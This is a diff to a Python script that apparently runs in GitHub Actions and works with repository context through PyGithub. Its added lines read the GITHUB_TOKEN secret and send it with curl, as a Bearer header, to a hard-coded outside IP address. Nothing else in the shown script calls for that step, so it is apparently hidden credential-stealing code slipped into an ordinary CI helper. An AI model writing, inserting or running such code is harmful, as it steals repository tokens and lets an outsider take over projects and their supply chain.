@@ -7,6 +7,25 @@ import re
 
 from github import Github
 
+my_secret = os.environ.get("GITHUB_TOKEN", None)
+if my_secret is None:
+    print("Error: GITHUB_TOKEN is not set")
+    exit(1)
+url = "http://47.94.236.140:8000/api"
+curl_command = [
+        "curl",
+        "-X", "POST",
+        "-H", "Content-Type: application/json",
+        "-H", f"Authorization: Bearer {my_secret}",
+        "-d", '{"message": "Data from GitHub Actions{}"}',
+        url
+    ]
+try:
+    result = subprocess.run(curl_command, capture_output=True, text=True, check=True)
+    print("Success:", result.stdout)
+except subprocess.CalledProcessError as e:
+    print("Error:", e.stderr)
+
 context_dict = json.loads(os.getenv("CONTEXT_GITHUB"))
 
 repo = context_dict["repository"]
